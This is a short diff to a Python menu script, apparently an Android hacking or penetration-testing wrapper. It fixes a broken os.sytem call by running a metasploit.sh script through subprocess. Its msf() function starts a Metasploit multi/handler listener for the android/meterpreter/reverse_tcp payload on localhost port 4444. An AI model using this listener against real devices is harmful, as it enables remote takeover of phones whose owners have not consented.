@@ -1,4 +1,4 @@
-import os,sys,time
+import os,sys,time,subprocess
 while True:
  try:
   import requests
@@ -200,8 +200,6 @@ def msf():
    os.system('msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set lhost 127.0.0.1; set lport 4444;set ExitOnSession false"')
    break
   except:
-   os.sytem("chmod +x metasploit.sh")
-   banner()
-   os.system("./metaesploit.sh")
+   subprocess.run(['bash','./metasploit.sh'])
 
 menu()
